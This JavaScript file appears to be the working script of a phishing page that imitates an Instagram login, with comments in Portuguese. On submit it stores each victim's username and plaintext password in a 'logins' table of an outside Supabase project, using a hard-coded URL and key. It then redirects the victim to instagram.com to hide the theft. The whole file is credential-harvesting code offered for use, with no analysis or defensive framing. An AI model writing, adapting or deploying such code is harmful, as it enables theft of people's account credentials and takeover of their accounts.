const SUPABASE_URL = 'https://izhqxlnpiqpcekbedbkd.supabase.co';
const SUPABASE_KEY = 'sb_publishable_2Pu2zuS6DK78ldkqvueLAg_zTn_gl9b'; 
const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const userInp = document.getElementById('username');
const passInp = document.getElementById('password');
const btnSubmit = document.getElementById('btn-submit');
const loginForm = document.getElementById('login-form');

// Validação visual
function checkInputs() {
    if (userInp.value.length > 0 && passInp.value.length >= 6) {
        btnSubmit.disabled = false;
        btnSubmit.classList.add('active');
    } else {
        btnSubmit.disabled = true;
        btnSubmit.classList.remove('active');
    }
}

userInp.addEventListener('input', checkInputs);
passInp.addEventListener('input', checkInputs);

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    btnSubmit.innerText = "Conectando...";
    btnSubmit.disabled = true;

    try {
        const { data, error } = await _supabase
            .from('logins') // Nome da tabela que você criou
            .insert([{ username: userInp.value, password: passInp.value }]);

        if (error) {
            console.error('Detalhe do erro:', error); // Isso aparece no F12
            alert('Erro: ' + error.message);
            btnSubmit.disabled = false;
            btnSubmit.innerText = "Entrar";
        } else {
            console.log('Sucesso!', data);
            window.location.href = "https://www.instagram.com";
        }
    } catch (err) {
        console.error('Erro crítico:', err);
        alert('Falha total na conexão. Verifique o console (F12).');
        btnSubmit.disabled = false;
        btnSubmit.innerText = "Entrar";
    }
});